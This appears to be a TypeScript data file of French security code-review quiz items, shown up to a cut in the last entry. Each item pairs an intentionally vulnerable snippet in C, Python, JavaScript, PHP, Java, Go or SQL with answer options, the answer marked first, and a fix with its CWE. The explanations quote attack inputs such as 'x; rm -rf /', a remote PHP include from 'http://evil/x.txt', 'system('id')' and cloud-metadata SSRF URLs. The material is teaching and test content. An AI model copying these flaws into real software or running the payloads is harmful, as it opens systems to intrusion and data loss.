import type { Exercise } from '../engine/types';

// ---------------------------------------------------------------------------
// Lot « Code review sécurité » (2) — snippets vulnérables ancrés sur des
// règles réelles CodeQL / Semgrep (paires source→sink) et des root-causes de
// bug bounty. Langages : C, Python, JS, PHP, Java, Go, SQL.
// Options équilibrées (bonne réponse en premier, position randomisée par shuffle.ts).
// ---------------------------------------------------------------------------

type Lang = Extract<Exercise, { type: 'find-error' }>['language'];

const S = (
  id: string, domain: Exercise['domain'], difficulty: Exercise['difficulty'],
  title: string, language: Lang, code: string, question: string,
  options: string[], explanation: string, tags: string[],
): Exercise => ({
  id, type: 'find-error', domain, topic: 'appsec', difficulty,
  title, language, code, question, options, answer: 0, explanation, tags,
});

export const security2Exercises: Exercise[] = [
  // ------------------------------------------------------------------ C
  S('s2-c-format-string', 'software', 'intermediate', 'Chaîne de format non contrôlée', 'c',
    `void log_event(const char *user_input) {
    char msg[128];
    snprintf(msg, sizeof(msg), "%s", user_input);
    fprintf(logfile, msg);   // <-- ici
}`,
    'Quelle est la vulnérabilité principale ?',
    ['Chaîne de format contrôlée par l\'utilisateur passée à fprintf',
     'Débordement de tampon dans le snprintf vers msg',
     'Fuite du descripteur de fichier logfile non fermé',
     'Condition de course lors de l\'écriture concurrente du log'],
    '`user_input` devient la chaîne de format de fprintf : `%n`/`%x` permettent lecture/écriture mémoire. Corriger avec `fprintf(logfile, "%s", msg)`. CWE-134.',
    ['c', 'format-string', 'cwe-134']),
  S('s2-c-int-overflow', 'software', 'senior', 'Allocation à taille calculée', 'c',
    `void *dup_items(uint32_t n, size_t sz) {
    char *buf = malloc(n * sz);      // <-- ici
    for (uint32_t i = 0; i < n; i++)
        memcpy(buf + i*sz, src[i], sz);
    return buf;
}`,
    'Quelle est la faille exploitable ?',
    ['Débordement entier sur n * sz qui sous-alloue le tampon',
     'Fuite mémoire car buf n\'est jamais libéré ensuite',
     'Déréférencement de pointeur nul si malloc échoue',
     'Lecture hors limites du tableau source src[i]'],
    '`n * sz` peut déborder (wrap) et rendre une allocation minuscule, puis memcpy écrit hors limites (heap overflow). Vérifier `n > SIZE_MAX / sz` avant. CWE-190.',
    ['c', 'integer-overflow', 'cwe-190']),
  S('s2-c-uaf', 'software', 'intermediate', 'Pointeur réutilisé après libération', 'c',
    `Conn *c = get_conn(id);
free(c->buf);
if (reconnect)
    c->buf[0] = '\\0';   // <-- ici
send_data(c->buf, len);`,
    'Quel est le défaut mémoire ?',
    ['Utilisation après libération (use-after-free) de c->buf',
     'Débordement de pile sur la variable locale c',
     'Comparaison de pointeur non initialisé reconnect',
     'Fuite mémoire du tampon c->buf alloué plus tôt'],
    '`c->buf` est utilisé après free, permettant lecture/écriture sur mémoire réallouée (corruption/RCE). Mettre `c->buf = NULL` après free et ré-allouer. CWE-416.',
    ['c', 'use-after-free', 'cwe-416']),
  S('s2-c-double-free', 'software', 'senior', 'Libération répétée en cas d\'erreur', 'c',
    `char *p = malloc(size);
if (parse(p) < 0) {
    free(p);
    goto cleanup;
}
process(p);
cleanup:
    free(p);   // <-- ici`,
    'Quelle est la vulnérabilité ?',
    ['Double libération de p sur le chemin d\'erreur',
     'Débordement de tas lors de l\'appel parse(p)',
     'Lecture de mémoire non initialisée dans p',
     'Fuite mémoire quand parse réussit sans erreur'],
    'Sur erreur, p est libéré puis re-libéré au label cleanup, corrompant les métadonnées du tas. Mettre `p = NULL` après le premier free. CWE-415.',
    ['c', 'double-free', 'cwe-415']),
  S('s2-c-signed-len', 'software', 'senior', 'Comparaison de longueur signée', 'c',
    `char dst[256];
int len = read_len_from_packet();  // attaquant
if (len > (int)sizeof(dst))
    return -1;
memcpy(dst, src, len);   // <-- ici`,
    'Où est la faille ?',
    ['len signé négatif passe le test puis explose en size_t',
     'sizeof(dst) est mal calculé sur ce tableau',
     'src peut être un pointeur non initialisé ici',
     'La pile n\'est pas alignée correctement pour memcpy'],
    'Un len négatif passe la vérification `> 256` mais devient énorme une fois converti en size_t par memcpy → dépassement. Utiliser size_t et vérifier la borne. CWE-195.',
    ['c', 'signedness', 'cwe-195']),
  // -------------------------------------------------------------- PYTHON
  S('s2-py-yaml', 'web', 'junior', 'Chargement YAML non sûr', 'python',
    `import yaml

def load_profile(data: str):
    profile = yaml.load(data)   # <-- ici
    return profile["name"]`,
    'Quelle est la vulnérabilité ?',
    ['yaml.load sans SafeLoader permet l\'exécution de code',
     'Injection de clé dans l\'accès profile["name"]',
     'Fuite de mémoire lors d\'un parsing YAML volumineux',
     'Traversée de chemin via le champ name du profil'],
    'yaml.load avec le Loader par défaut instancie des objets Python arbitraires (`!!python/object/apply`) → RCE. Utiliser `yaml.safe_load(data)`. CWE-502.',
    ['python', 'deserialization', 'cwe-502']),
  S('s2-py-pickle', 'web', 'intermediate', 'Désérialisation pickle', 'python',
    `import pickle, base64

@app.post("/session")
def restore(token: str):
    raw = base64.b64decode(token)
    return pickle.loads(raw)   # <-- ici`,
    'Quel est le risque ?',
    ['pickle.loads sur données client permet l\'exécution de code',
     'Le décodage base64 peut lever une exception non gérée',
     'Le token n\'est pas signé, donc rejouable par un tiers',
     'La session créée n\'expire jamais côté serveur'],
    'pickle.loads appelle `__reduce__` sur des données contrôlées → RCE. Ne jamais désérialiser des données non fiables ; utiliser JSON ou signer/valider. CWE-502.',
    ['python', 'deserialization', 'cwe-502']),
  S('s2-py-verify-false', 'web', 'junior', 'Validation TLS désactivée', 'python',
    `import requests

def fetch(url):
    r = requests.get(url, verify=False)   # <-- ici
    return r.json()`,
    'Quelle est la faille de sécurité ?',
    ['verify=False désactive la validation du certificat TLS',
     'SSRF car url n\'est pas restreint à une liste blanche',
     'Injection JSON dans le corps de la réponse serveur',
     'Absence de délai d\'expiration sur la requête HTTP'],
    'verify=False autorise les attaques man-in-the-middle (certificat forgé accepté). Garder la vérification activée et fournir le CA si besoin. CWE-295.',
    ['python', 'tls', 'cwe-295']),
  S('s2-py-ssti', 'web', 'intermediate', 'Template rendu depuis une chaîne', 'python',
    `from flask import render_template_string, request

@app.route("/hello")
def hello():
    name = request.args.get("name")
    return render_template_string("<h1>Salut " + name + "</h1>")`,
    'Quelle vulnérabilité est présente ?',
    ['Injection de template serveur (SSTI) menant à RCE',
     'XSS réfléchi simple dans le paramètre name',
     'Injection d\'en-tête HTTP via le paramètre name',
     'Traversée de répertoire vers un template arbitraire'],
    'Concaténer l\'entrée dans render_template_string laisse Jinja2 évaluer `{{7*7}}` → accès aux objets Python et RCE. Passer les variables séparément à un template statique. CWE-1336.',
    ['python', 'ssti', 'cwe-1336']),
  S('s2-py-xxe', 'web', 'senior', 'Parsing XML avec entités', 'python',
    `from lxml import etree

def parse(xml_bytes):
    p = etree.XMLParser(resolve_entities=True, no_network=False)
    root = etree.fromstring(xml_bytes, p)   # <-- ici
    return root.findtext("name")`,
    'Quelle est la vulnérabilité ?',
    ['XXE : entités externes résolues et réseau autorisé',
     'Déni de service par expansion récursive de nœuds',
     'Injection XPath via l\'expression findtext utilisée',
     'Désérialisation d\'objets Python depuis le flux XML'],
    '`resolve_entities=True` + `no_network=False` permet la lecture de fichiers locaux et SSRF via `<!ENTITY ... SYSTEM>`. Utiliser `resolve_entities=False, no_network=True` ou defusedxml. CWE-611.',
    ['python', 'xxe', 'cwe-611']),
  S('s2-py-ldap', 'web', 'intermediate', 'Filtre LDAP concaténé', 'python',
    `def find_user(conn, username):
    flt = "(&(objectClass=user)(uid=" + username + "))"
    conn.search("dc=corp,dc=fr", flt)   # <-- ici
    return conn.entries`,
    'Quelle est la faille ?',
    ['Injection LDAP via username non échappé dans le filtre',
     'Injection SQL dans cette requête d\'annuaire',
     'Fuite de la base DN dc=corp,dc=fr codée en dur',
     'Absence de pagination des résultats LDAP renvoyés'],
    '`username = *)(uid=*` altère la logique du filtre pour contourner l\'auth ou énumérer. Échapper avec `ldap.filter.escape_filter_chars`. CWE-90.',
    ['python', 'ldap-injection', 'cwe-90']),
  S('s2-py-assert', 'web', 'intermediate', 'Contrôle d\'accès par assert', 'python',
    `def delete_account(user, target_id):
    assert user.is_admin, "forbidden"   # <-- ici
    db.execute("DELETE FROM accounts WHERE id=%s", (target_id,))
    return {"ok": True}`,
    'Pourquoi ce contrôle est-il dangereux ?',
    ['Les assert sont supprimés quand Python tourne avec -O',
     'Injection SQL possible dans la requête DELETE',
     'Le message d\'erreur divulgue la logique interne',
     'is_admin peut être surchargé par l\'attaquant lui-même'],
    'Compilé en mode optimisé (`python -O`), tout assert est retiré et le contrôle disparaît → escalade. Utiliser un `if ... raise PermissionError`. CWE-617.',
    ['python', 'access-control', 'cwe-617']),
  S('s2-py-shell', 'web', 'junior', 'Sous-processus avec shell', 'python',
    `import subprocess

def ping(host):
    out = subprocess.check_output(
        "ping -c 1 " + host, shell=True)   # <-- ici
    return out.decode()`,
    'Quelle est la vulnérabilité ?',
    ['Injection de commande via shell=True et concaténation',
     'Traversée de chemin dans l\'argument host fourni',
     'SSRF car host peut viser un service interne',
     'Débordement du tampon de sortie out renvoyé'],
    '`host = "x; rm -rf /"` s\'exécute via le shell. Passer une liste d\'arguments et `shell=False` : `check_output(["ping","-c","1",host])`. CWE-78.',
    ['python', 'command-injection', 'cwe-78']),
  S('s2-py-marksafe', 'web', 'intermediate', 'HTML marqué comme sûr', 'python',
    `from django.utils.safestring import mark_safe

def render_bio(request):
    bio = request.GET.get("bio", "")
    return HttpResponse(mark_safe("<div>" + bio + "</div>"))`,
    'Quelle est la faille ?',
    ['XSS : mark_safe désactive l\'auto-échappement de Django',
     'SSTI dans le template rendu ensuite côté serveur',
     'Injection d\'en-tête dans l\'objet HttpResponse',
     'Traversée de chemin via le paramètre bio reçu'],
    'mark_safe indique à Django de ne pas échapper, donc `bio=<script>` s\'exécute. Ne jamais marquer sûre une entrée utilisateur ; laisser le template échapper. CWE-79.',
    ['python', 'xss', 'cwe-79']),
  // ---------------------------------------------------------- JAVASCRIPT
  S('s2-js-vm', 'web', 'senior', 'Bac à sable vm Node', 'javascript',
    `const vm = require("vm");

app.post("/calc", (req, res) => {
  const result = vm.runInNewContext(req.body.expr); // <-- ici
  res.json({ result });
});`,
    'Quel est le problème ?',
    ['Exécution de code : vm n\'est pas un vrai bac à sable',
     'Pollution de prototype via l\'objet req.body reçu',
     'Déni de service par expression régulière malveillante',
     'Injection NoSQL dans le champ expr transmis'],
    'vm.runInNewContext évalue du JS arbitraire et l\'isolation est contournable (`this.constructor.constructor`) → RCE. Utiliser isolated-vm ou un évaluateur sûr. CWE-94.',
    ['javascript', 'code-injection', 'cwe-94']),
  S('s2-js-redos', 'web', 'intermediate', 'Regex à quantificateurs imbriqués', 'javascript',
    `function isValid(input) {
  return /^(a+)+$/.test(input);   // <-- ici
}
app.get("/check", (req, res) =>
  res.json({ ok: isValid(req.query.v) }));`,
    'Quelle est la vulnérabilité ?',
    ['ReDoS : backtracking catastrophique sur (a+)+',
     'Injection de regex fournie par l\'utilisateur',
     'Contournement de validation via des caractères Unicode',
     'XSS réfléchi via le paramètre v renvoyé'],
    '`(a+)+$` provoque un backtracking exponentiel sur une entrée comme "aaaa...!", bloquant l\'event loop. Réécrire la regex sans ambiguïté ou limiter la taille. CWE-1333.',
    ['javascript', 'redos', 'cwe-1333']),
  S('s2-js-nosql', 'web', 'intermediate', 'Requête Mongo depuis le corps', 'javascript',
    `app.post("/login", async (req, res) => {
  const user = await User.findOne({
    name: req.body.name,
    pass: req.body.pass          // <-- ici
  });
  res.json({ ok: !!user });
});`,
    'Quelle est la faille ?',
    ['Injection NoSQL : pass peut être un objet {$ne:null}',
     'XSS stocké via le champ name fourni au login',
     'Pollution de prototype sur l\'objet req.body reçu',
     'Fuite du hash de mot de passe dans la réponse'],
    'Un JSON `{"pass":{"$ne":null}}` transforme l\'égalité en opérateur et contourne le login. Caster en chaîne : `String(req.body.pass)` et sanitiser. CWE-943.',
    ['javascript', 'nosql-injection', 'cwe-943']),
  S('s2-js-redirect', 'web', 'junior', 'Redirection non validée', 'javascript',
    `app.get("/go", (req, res) => {
  const target = req.query.next;
  res.redirect(target);   // <-- ici
});`,
    'Quelle est la vulnérabilité ?',
    ['Redirection ouverte vers un domaine externe arbitraire',
     'Injection d\'en-tête HTTP dans la réponse renvoyée',
     'XSS réfléchi via le paramètre next dans l\'URL',
     'SSRF vers un service interne du réseau privé'],
    '`next=https://evil.tld` redirige la victime hors du site (phishing). Autoriser uniquement des chemins relatifs ou une liste blanche. CWE-601.',
    ['javascript', 'open-redirect', 'cwe-601']),
  S('s2-js-proto', 'web', 'senior', 'Fusion récursive d\'objets', 'javascript',
    `function merge(dst, src) {
  for (const k in src) {
    if (typeof src[k] === "object")
      merge(dst[k] = dst[k] || {}, src[k]);
    else dst[k] = src[k];   // <-- ici
  }
}
merge({}, JSON.parse(req.body));`,
    'Quelle est la faille ?',
    ['Pollution de prototype via une clé __proto__ du JSON',
     'Déni de service par récursion infinie sur les cycles',
     'Injection NoSQL dans l\'objet fusionné résultant',
     'Fuite mémoire due à la copie profonde répétée'],
    'Un JSON `{"__proto__":{"isAdmin":true}}` modifie Object.prototype globalement. Ignorer `__proto__`/`constructor`/`prototype` ou utiliser Map/`Object.create(null)`. CWE-1321.',
    ['javascript', 'prototype-pollution', 'cwe-1321']),
  S('s2-js-eval', 'web', 'junior', 'Évaluation d\'expression', 'javascript',
    `app.get("/sum", (req, res) => {
  const formula = req.query.f;
  res.json({ r: eval(formula) });   // <-- ici
});`,
    'Quel est le risque ?',
    ['Injection de code : eval exécute du JS arbitraire',
     'Pollution de prototype via le paramètre f reçu',
     'Débordement de pile sur les très grandes formules',
     'XSS réfléchi dans la réponse JSON renvoyée'],
    '`f=process.mainModule.require(\'child_process\').execSync(\'id\')` s\'exécute côté serveur → RCE. Utiliser un parseur mathématique dédié, jamais eval. CWE-95.',
    ['javascript', 'code-injection', 'cwe-95']),
  S('s2-js-jwt-decode', 'web', 'intermediate', 'JWT décodé sans vérification', 'javascript',
    `const jwt = require("jsonwebtoken");

function currentUser(req) {
  const token = req.headers.authorization.split(" ")[1];
  const payload = jwt.decode(token);   // <-- ici
  return payload.sub;
}`,
    'Quelle est la faille ?',
    ['jwt.decode ne vérifie pas la signature du token',
     'Le token n\'est pas transmis en HTTPS uniquement',
     'Injection d\'en-tête via le header Authorization',
     'Le secret de signature est codé en dur dans le code'],
    'decode lit le payload sans valider la signature : un attaquant forge n\'importe quel `sub`. Utiliser `jwt.verify(token, secret, {algorithms:[\'HS256\']})`. CWE-347.',
    ['javascript', 'jwt', 'cwe-347']),
  S('s2-js-random', 'web', 'intermediate', 'Jeton via Math.random', 'javascript',
    `function resetToken() {
  let t = "";
  for (let i = 0; i < 32; i++)
    t += Math.floor(Math.random() * 16).toString(16); // <-- ici
  return t;
}`,
    'Quelle est la vulnérabilité ?',
    ['Aléa non cryptographique : jeton de reset prédictible',
     'Le jeton est trop court pour résister au brute force',
     'Fuite de timing lors de la comparaison du jeton',
     'Injection de code via la concaténation de chaîne'],
    'Math.random n\'est pas un CSPRNG ; son état peut être reconstruit et les jetons prédits. Utiliser `crypto.randomBytes(16).toString(\'hex\')`. CWE-338.',
    ['javascript', 'randomness', 'cwe-338']),
  // ----------------------------------------------------------------- PHP
  S('s2-php-lfi', 'web', 'junior', 'Inclusion locale de fichier', 'php',
    `<?php
$page = $_GET['page'];
include($page . ".php");   // <-- ici
?>`,
    'Quelle est la vulnérabilité ?',
    ['LFI : inclusion d\'un fichier arbitraire via page',
     'XSS réfléchi via le paramètre page dans l\'URL',
     'Injection SQL dans la sélection de la page',
     'Fixation de session lors de l\'inclusion du fichier'],
    '`page=../../../../etc/passwd%00` ou un wrapper `php://filter` expose fichiers/code. Utiliser une liste blanche : `include(WHITELIST[$page])`. CWE-98.',
    ['php', 'lfi', 'cwe-98']),
  S('s2-php-rfi', 'web', 'intermediate', 'Inclusion distante activée', 'php',
    `<?php
$module = $_GET['module'];
require($module);   // allow_url_include=On  <-- ici
?>`,
    'Quel est le risque ?',
    ['RFI : exécution d\'un script PHP hébergé à distance',
     'Traversée de chemin vers des fichiers locaux seulement',
     'Déni de service par inclusion récursive du module',
     'Divulgation du code source du module inclus'],
    'Avec `allow_url_include=On`, `module=http://evil/x.txt` charge et exécute du PHP distant → RCE. Désactiver l\'option et valider par liste blanche. CWE-98.',
    ['php', 'rfi', 'cwe-98']),
  S('s2-php-preg-e', 'web', 'senior', 'preg_replace avec /e', 'php',
    `<?php
$out = preg_replace(
  '/\\[b\\](.*?)\\[\\/b\\]/e',       // <-- ici
  "strtoupper('$1')",
  $_POST['bbcode']);
?>`,
    'Quelle est la faille ?',
    ['Le modificateur /e évalue le remplacement comme du code PHP',
     'ReDoS via la regex non ancrée sur le champ bbcode',
     'XSS stocké dans le contenu BBCode transformé',
     'Injection SQL après transformation du texte reçu'],
    '`/e` fait passer le remplacement dans eval ; une entrée `\'.system(\'id\').\'` s\'exécute → RCE. Utiliser `preg_replace_callback` (le `/e` est supprimé depuis PHP 7). CWE-94.',
    ['php', 'code-injection', 'cwe-94']),
  S('s2-php-extract', 'web', 'intermediate', 'Extraction de variables', 'php',
    `<?php
$is_admin = false;
extract($_GET);              // <-- ici
if ($is_admin) { show_panel(); }
?>`,
    'Quelle est la vulnérabilité ?',
    ['extract écrase $is_admin avec une variable de la requête',
     'Injection SQL dans la fonction show_panel appelée',
     'XSS réfléchi via les paramètres GET extraits',
     'Fixation de session sur la variable admin locale'],
    '`?is_admin=1` crée/écrase `$is_admin=true` et déverrouille le panneau. Ne jamais extract une source non fiable ; utiliser EXTR_SKIP ou des clés explicites. CWE-621.',
    ['php', 'variable-injection', 'cwe-621']),
  S('s2-php-assert', 'web', 'senior', 'assert sur entrée utilisateur', 'php',
    `<?php
$expr = $_GET['filter'];
if (assert($expr)) {         // <-- ici
    render_results($expr);
}
?>`,
    'Quel est le problème ?',
    ['assert évalue une chaîne comme du code PHP (RCE)',
     'XSS réfléchi via le paramètre filter dans l\'URL',
     'Injection SQL dans la fonction render_results',
     'Divulgation du chemin absolu de l\'application'],
    'Avant PHP 8, `assert($string)` exécute la chaîne via eval, donc `filter=system(\'id\')` → RCE. Ne jamais passer d\'entrée à assert ; valider explicitement. CWE-94.',
    ['php', 'code-injection', 'cwe-94']),
  S('s2-php-mail', 'web', 'intermediate', 'En-tête d\'e-mail injectable', 'php',
    `<?php
$from = $_POST['email'];
mail("support@app.fr", "Contact",
     $_POST['msg'],
     "From: " . $from);      // <-- ici
?>`,
    'Quelle est la faille ?',
    ['Injection d\'en-têtes e-mail via des retours à la ligne',
     'XSS stocké dans le corps du message envoyé',
     'Injection de commande via la fonction mail',
     'Divulgation de l\'adresse support@app.fr interne'],
    'Un email contenant `\\r\\nBcc: victimes...` ajoute des en-têtes (spam/relais). Filtrer les `\\r`/`\\n` et valider avec `filter_var(..., FILTER_VALIDATE_EMAIL)`. CWE-93.',
    ['php', 'header-injection', 'cwe-93']),
  S('s2-php-upload', 'web', 'intermediate', 'Upload sans restriction', 'php',
    `<?php
$name = $_FILES['f']['name'];
move_uploaded_file(
  $_FILES['f']['tmp_name'],
  "uploads/" . $name);       // <-- ici
?>`,
    'Quelle est la vulnérabilité ?',
    ['Upload d\'un .php exécutable dans un dossier web servi',
     'Traversée de chemin uniquement, sans exécution possible',
     'Déni de service par fichier volumineux uploadé',
     'Écrasement CSRF du formulaire d\'upload de fichier'],
    'Rien ne restreint l\'extension : un shell.php déposé dans uploads/ s\'exécute → RCE. Valider le type MIME, forcer une extension sûre, stocker hors racine web. CWE-434.',
    ['php', 'file-upload', 'cwe-434']),
  // ---------------------------------------------------------------- JAVA
  S('s2-java-xxe', 'web', 'intermediate', 'DocumentBuilder par défaut', 'java',
    `DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
DocumentBuilder b = f.newDocumentBuilder();
Document doc = b.parse(request.getInputStream()); // <-- ici
String v = doc.getElementsByTagName("name").item(0).getTextContent();`,
    'Quelle est la vulnérabilité ?',
    ['XXE : la factory ne désactive pas les entités externes',
     'Injection XPath dans l\'appel getElementsByTagName',
     'Déni de service par document XML profondément imbriqué',
     'Désérialisation Java depuis le flux XML reçu'],
    'Par défaut, DocumentBuilderFactory résout les entités externes (SYSTEM) → lecture de fichiers/SSRF. Appeler `setFeature("...disallow-doctype-decl", true)`. CWE-611.',
    ['java', 'xxe', 'cwe-611']),
  S('s2-java-ssrf', 'web', 'intermediate', 'Récupération d\'URL côté serveur', 'java',
    `@GetMapping("/preview")
String preview(@RequestParam String url) throws IOException {
    URL u = new URL(url);
    try (InputStream in = u.openStream()) {   // <-- ici
        return new String(in.readAllBytes());
    }
}`,
    'Quel est le risque ?',
    ['SSRF : requête vers un service interne contrôlée par l\'URL',
     'Traversée de chemin via le paramètre url fourni',
     'XXE lors de la lecture du flux distant récupéré',
     'Injection d\'en-tête dans la requête HTTP sortante'],
    '`url=http://169.254.169.254/...` vise services internes/métadonnées cloud. Valider schéma+hôte via liste blanche, bloquer les IP privées. CWE-918.',
    ['java', 'ssrf', 'cwe-918']),
  S('s2-java-spel', 'web', 'senior', 'Évaluation d\'expression SpEL', 'java',
    `ExpressionParser p = new SpelExpressionParser();
Expression e = p.parseExpression(userInput);   // <-- ici
Object v = e.getValue();
return v.toString();`,
    'Quelle est la faille ?',
    ['Injection SpEL menant à l\'exécution de code arbitraire',
     'Injection de log via la valeur retournée par getValue',
     'Déréférencement nul si l\'expression fournie est vide',
     'Fuite d\'informations via l\'appel à toString'],
    'SpEL permet `T(java.lang.Runtime).getRuntime().exec(...)` → RCE. Ne jamais parser d\'entrée utilisateur ; utiliser SimpleEvaluationContext restreint. CWE-94.',
    ['java', 'expression-injection', 'cwe-94']),
  S('s2-java-random', 'web', 'intermediate', 'Jeton via java.util.Random', 'java',
    `String makeToken() {
    Random r = new Random();      // <-- ici
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < 16; i++)
        sb.append(Integer.toHexString(r.nextInt(16)));
    return sb.toString();
}`,
    'Quelle est la vulnérabilité ?',
    ['java.util.Random est prédictible pour un jeton de sécurité',
     'Le jeton généré est trop court face au brute force',
     'Fuite de timing sur la comparaison ultérieure du jeton',
     'Débordement d\'entier possible sur l\'appel nextInt(16)'],
    'Random est un PRNG linéaire dont l\'état se reconstruit à partir de quelques sorties, rendant les jetons prévisibles. Utiliser java.security.SecureRandom. CWE-330.',
    ['java', 'randomness', 'cwe-330']),
  S('s2-java-ldap', 'web', 'intermediate', 'Filtre LDAP en Java', 'java',
    `String filter = "(uid=" + username + ")";
NamingEnumeration<SearchResult> res =
    ctx.search("ou=people", filter, ctls);   // <-- ici
return res.hasMore();`,
    'Quelle est la faille ?',
    ['Injection LDAP via username non échappé dans le filtre',
     'Injection SQL dans cette requête d\'annuaire LDAP',
     'Fuite de la base DN ou=people codée en dur',
     'Absence de délai d\'expiration sur la recherche'],
    '`username = *)(uid=*))(|(uid=*` modifie la logique du filtre (contournement d\'auth). Échapper les métacaractères LDAP ou utiliser des requêtes paramétrées JNDI. CWE-90.',
    ['java', 'ldap-injection', 'cwe-90']),
  S('s2-java-xpath', 'web', 'intermediate', 'Requête XPath concaténée', 'java',
    `XPath xp = XPathFactory.newInstance().newXPath();
String q = "/users/user[name='" + name + "']/pass";
String pass = xp.evaluate(q, doc);   // <-- ici`,
    'Quelle est la vulnérabilité ?',
    ['Injection XPath permettant de contourner le filtre',
     'Injection SQL dans la requête utilisateur construite',
     'XXE lors de l\'évaluation du document XML',
     'Fuite du mot de passe extrait dans les logs'],
    '`name = \' or \'1\'=\'1` retourne tous les nœuds et contourne l\'authentification. Utiliser des variables XPath (XPathVariableResolver) au lieu de concaténer. CWE-643.',
    ['java', 'xpath-injection', 'cwe-643']),
  S('s2-java-redirect', 'web', 'junior', 'Redirection Spring non validée', 'java',
    `@GetMapping("/login-ok")
String after(@RequestParam String returnUrl) {
    return "redirect:" + returnUrl;   // <-- ici
}`,
    'Quel est le problème ?',
    ['Redirection ouverte vers une URL externe arbitraire',
     'SSRF vers un service interne du réseau privé',
     'XSS réfléchi via le paramètre returnUrl fourni',
     'Injection d\'en-tête HTTP Location dans la réponse'],
    '`returnUrl=//evil.tld` redirige la victime hors du site (phishing/vol de jeton). N\'autoriser que des chemins relatifs validés ou une liste blanche. CWE-601.',
    ['java', 'open-redirect', 'cwe-601']),
  // ------------------------------------------------------------------ GO
  S('s2-go-ssrf', 'web', 'intermediate', 'Récupération HTTP en Go', 'go',
    `func preview(w http.ResponseWriter, r *http.Request) {
    url := r.URL.Query().Get("target")
    resp, _ := http.Get(url)   // <-- ici
    body, _ := io.ReadAll(resp.Body)
    w.Write(body)
}`,
    'Quelle est la vulnérabilité ?',
    ['SSRF : http.Get cible une URL fournie par le client',
     'XSS réfléchi car le corps est renvoyé tel quel',
     'Traversée de chemin via le paramètre target reçu',
     'Fuite de mémoire car resp.Body n\'est pas fermé'],
    '`target=http://169.254.169.254/...` atteint services internes/métadonnées. Valider schéma+hôte via liste blanche et bloquer les plages privées. CWE-918.',
    ['go', 'ssrf', 'cwe-918']),
  S('s2-go-sql', 'software', 'junior', 'Concaténation SQL en Go', 'go',
    `func getUser(db *sql.DB, name string) *sql.Row {
    q := "SELECT id, mail FROM users WHERE name = '" + name + "'"
    return db.QueryRow(q)   // <-- ici
}`,
    'Quelle est la faille ?',
    ['Injection SQL par concaténation directe de name',
     'Fuite de connexion si QueryRow échoue en cours',
     'Divulgation du champ mail à un tiers non autorisé',
     'Absence d\'index sur la colonne name interrogée'],
    '`name = \' OR \'1\'=\'1` altère la requête (exfiltration/contournement). Utiliser des paramètres : `db.QueryRow("... WHERE name = ?", name)`. CWE-89.',
    ['go', 'sql-injection', 'cwe-89']),
  S('s2-go-tls', 'web', 'intermediate', 'Vérification TLS ignorée', 'go',
    `tr := &http.Transport{
    TLSClientConfig: &tls.Config{
        InsecureSkipVerify: true,   // <-- ici
    },
}
client := &http.Client{Transport: tr}`,
    'Quelle est la vulnérabilité ?',
    ['InsecureSkipVerify désactive la validation du certificat',
     'SSRF car aucune restriction d\'hôte n\'est appliquée',
     'Réutilisation non sûre du transport entre requêtes',
     'Absence de délai d\'expiration sur le client HTTP'],
    'Le certificat serveur n\'est plus vérifié, ouvrant la porte au man-in-the-middle. Retirer l\'option ou configurer RootCAs avec le CA attendu. CWE-295.',
    ['go', 'tls', 'cwe-295']),
  S('s2-go-template', 'web', 'senior', 'text/template pour du HTML', 'go',
    `import "text/template"

func render(w http.ResponseWriter, name string) {
    t := template.Must(template.New("p").Parse("<h1>{{.}}</h1>"))
    t.Execute(w, name)   // <-- ici
}`,
    'Quel est le problème ?',
    ['XSS : text/template n\'échappe pas le contexte HTML',
     'SSTI menant à l\'exécution de code côté serveur',
     'Injection de template via le nom de gabarit "p"',
     'Injection d\'en-tête dans la réponse HTTP écrite'],
    'text/template ne fait aucun échappement contextuel, donc `name=<script>` s\'exécute. Utiliser le paquet html/template qui échappe automatiquement. CWE-79.',
    ['go', 'xss', 'cwe-79']),
  S('s2-go-redirect', 'web', 'junior', 'Redirection Go non validée', 'go',
    `func redir(w http.ResponseWriter, r *http.Request) {
    next := r.URL.Query().Get("next")
    http.Redirect(w, r, next, 302)   // <-- ici
}`,
    'Quelle est la faille ?',
    ['Redirection ouverte vers un domaine arbitraire',
     'SSRF côté serveur via le paramètre next fourni',
     'XSS réfléchi via l\'en-tête Location renvoyé',
     'Fixation de session lors de la redirection HTTP'],
    '`next=https://evil.tld` détourne la victime (phishing/vol de jeton). N\'accepter que des chemins relatifs ou une liste blanche. CWE-601.',
    ['go', 'open-redirect', 'cwe-601']),
  S('s2-go-rand', 'software', 'intermediate', 'Jeton via math/rand', 'go',
    `import "math/rand"

func apiKey() string {
    b := make([]byte, 16)
    for i := range b { b[i] = byte(rand.Intn(256)) }  // <-- ici
    return hex.EncodeToString(b)
}`,
    'Quelle est la vulnérabilité ?',
    ['math/rand non cryptographique rend la clé prédictible',
     'La clé de 16 octets est trop courte à deviner',
     'Fuite de timing lors de la génération de la clé',
     'Encodage hexadécimal réversible de la clé produite'],
    'math/rand est déterministe (état/graine reconstituables), donc les clés sont prédictibles. Utiliser `crypto/rand.Read`. CWE-338.',
    ['go', 'randomness', 'cwe-338']),
  // ----------------------------------------------------------------- SQL
  S('s2-sql-second-order', 'software', 'senior', 'SQL second-order stocké', 'sql',
    `-- etape 1 : valeur "sure" stockee
INSERT INTO prefs(uid, city) VALUES (42, @city);
-- etape 2 : reutilisation dans du SQL dynamique
SET @q = 'SELECT * FROM shops WHERE city=''' +
         (SELECT city FROM prefs WHERE uid=42) + '''';
EXEC(@q);   -- <-- ici`,
    'Quelle est la vulnérabilité ?',
    ['Injection SQL de second ordre via la valeur city stockée',
     'Élévation de privilège via EXEC en tant que propriétaire',
     'Fuite de données par jointure implicite manquante',
     'Condition de course entre les étapes 1 et 2'],
    'La valeur, sûre à l\'insertion, est concaténée plus tard dans du SQL dynamique (`city = \'\' OR 1=1 --`). Paramétrer aussi la seconde étape (sp_executesql). CWE-89.',
    ['sql', 'second-order', 'cwe-89']),
  S('s2-sql-sproc', 'software', 'intermediate', 'Procédure stockée dynamique', 'sql',
    `CREATE PROCEDURE search_user @name NVARCHAR(50) AS
BEGIN
  DECLARE @sql NVARCHAR(400);
  SET @sql = 'SELECT * FROM users WHERE name = ''' + @name + '''';
  EXEC(@sql);   -- <-- ici
END`,
    'Quelle est la faille ?',
    ['SQL dynamique concaténé, injectable via @name',
     'Débordement du tampon @sql limité à 400 caractères',
     'Divulgation de toutes les colonnes via SELECT *',
     'Absence de transaction autour de l\'exécution'],
    'Le paramètre typé n\'aide pas : il est concaténé dans EXEC, donc `@name = \' OR 1=1 --` fuit tout. Utiliser sp_executesql avec paramètres liés. CWE-89.',
